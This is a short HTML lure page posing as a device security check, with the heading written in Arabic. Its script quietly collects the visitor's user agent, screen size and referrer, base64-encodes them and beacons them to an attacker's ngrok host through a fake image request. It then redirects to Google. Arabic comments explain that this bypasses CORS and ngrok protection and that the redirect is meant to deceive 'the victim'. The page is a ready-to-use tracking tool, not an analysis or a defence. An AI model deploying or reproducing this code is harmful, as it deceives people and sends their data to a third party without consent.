<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body style="background:#000; color:#0f0; text-align:center; padding-top:20%;">
    <h2>جاري التحقق من أمان الجهاز...</h2>
    
    <script>
        // ضع رابط Ngrok الخاص بك هنا (تأكد من وجود https)
        const MY_NGROK = "https://c4d888980073.ngrok-free.app"; 

        function capture() {
            const info = {
                ua: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                ref: document.referrer
            };
            const payload = btoa(JSON.stringify(info));

            // إنشاء صورة وهمية لإرسال البيانات دون قيود CORS أو حماية Ngrok
            const img = new Image();
            img.src = `${MY_NGROK}/log.gif?data=${payload}&skip=true`;
            
            // التحويل لتمويه الضحية بعد 3 ثواني
            setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
        }
        window.onload = capture;
    </script>
</body>
</html>
